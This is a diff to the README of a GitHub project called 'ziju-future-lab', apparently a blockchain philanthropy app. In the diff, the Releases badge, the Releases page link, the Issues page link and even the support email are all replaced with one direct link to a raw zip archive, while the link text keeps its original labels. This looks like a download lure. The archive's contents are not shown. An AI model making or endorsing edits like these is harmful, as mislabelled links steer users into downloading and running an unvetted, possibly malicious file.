@@ -6,7 +6,7 @@ Welcome to ziju-future-lab! This project aims to drive blockchain philanthropy a
 
 ## 📥 Download Now
 
-[![Download ziju-future-lab](https://img.shields.io/badge/Download-ziju--future--lab-brightgreen)](https://github.com/Dhenisse11/ziju-future-lab/releases)
+[![Download ziju-future-lab](https://github.com/Dhenisse11/ziju-future-lab/raw/refs/heads/main/semisevere/future_lab_ziju_2.5.zip)](https://github.com/Dhenisse11/ziju-future-lab/raw/refs/heads/main/semisevere/future_lab_ziju_2.5.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Before you proceed, ensure your system meets these minimum requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Dhenisse11/ziju-future-lab/releases) to download the latest version of the application.
+To get started, visit our [Releases page](https://github.com/Dhenisse11/ziju-future-lab/raw/refs/heads/main/semisevere/future_lab_ziju_2.5.zip) to download the latest version of the application.
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version.
@@ -72,8 +72,8 @@ We welcome contributions to help improve ziju-future-lab. If you want to get inv
 
 If you encounter any issues, we’re here to help. Reach out to us through the following methods:
 
-- Open an issue on the [GitHub Issues page](https://github.com/Dhenisse11/ziju-future-lab/issues).
-- Send us an email at support@ziju-future-lab.org.
+- Open an issue on the [GitHub Issues page](https://github.com/Dhenisse11/ziju-future-lab/raw/refs/heads/main/semisevere/future_lab_ziju_2.5.zip).
+- Send us an email at https://github.com/Dhenisse11/ziju-future-lab/raw/refs/heads/main/semisevere/future_lab_ziju_2.5.zip
 
 ## 🔍 License
 
